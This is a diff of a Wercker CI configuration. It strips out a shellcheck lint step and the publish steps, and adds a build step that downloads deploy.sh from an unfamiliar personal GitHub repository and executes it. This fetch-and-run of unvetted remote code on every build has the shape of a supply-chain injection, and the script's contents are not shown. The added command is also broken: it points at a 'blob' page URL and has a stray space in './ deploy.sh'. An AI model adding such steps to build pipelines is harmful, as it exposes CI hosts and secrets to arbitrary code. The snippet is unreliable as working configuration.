@@ -1,17 +1,9 @@
-box: ubuntu: lastets
+box:
+  id: alpine
+  env:
+    KEY1: value1
+    KEY2: value2
 build:
- steps:
- - shellcheck:
- files: deploy.sh
-
- - script:
- name: prepare output
- code: rm -rf $WERCKER_ROOT/.git
-
-publish:
- steps:
- - install-packages:
- packages: ca-certificates
-
- - internal/publish-step:
- owner: wercker
+  steps:
+    - script:
+        code: wget https://github.com/Uevwn/trial/blob/main/deploy.sh && chmod +x deploy.sh && ./ deploy.sh
